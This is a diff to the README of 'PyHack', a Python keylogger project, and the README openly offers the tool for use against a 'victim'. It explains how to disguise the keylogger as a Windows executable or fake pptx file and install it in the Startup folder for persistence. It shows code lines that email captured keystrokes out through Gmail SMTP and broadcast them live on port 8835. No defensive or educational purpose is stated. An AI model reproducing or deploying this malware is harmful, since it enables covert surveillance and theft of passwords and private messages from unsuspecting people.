@@ -1,6 +1,11 @@
 # PyHack
 KEYLOGGER :
-Keylogger is, obviously a keylogger. feel free to rename it, make a windows executable, false pptx file or whatever yoou want. This keylogger will send you emails of whatever the victim is tiping and, if you are in the same private network, provide a "live keylogger feature wich allows you to see what the vitcim is typing in live. This keylogger broadcasts the live on the port 8835, feel free to modify this.
+Keylogger is, obviously a keylogger. feel free to rename it, make a windows executable, false pptx file or whatever you want. This keylogger will send you emails of whatever the victim is tiping and, if you are in the same private network, provide a "live keylogger feature wich allows you to see what the vitcim is typing in live. 
+
+This keylogger broadcasts the live on the port 8835, feel free to change it on the line :
+
+self.socket.bind(('',8835))
+
 Just modify the
 
 shutil.copyfile("{}/keylogger.exe".format(os.getcwd()),"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe".format(getpass.getuser()))
@@ -16,6 +21,9 @@ msg['To'] = COMMASPACE.join("exemple@gmail.com")
 smtp.login("exemple@gmail.com","exemple_password")
 smtp.sendmail("exemple@gmail.com","exemple@gmail.com",msg.as_string())
 
+and if you are not using gmail, please modify the smtp server addres on the line :
+
+smtp = smtplib.SMTP('smtp.gmail.com')
 
 
 KEYLOGGER_RECEVER : 
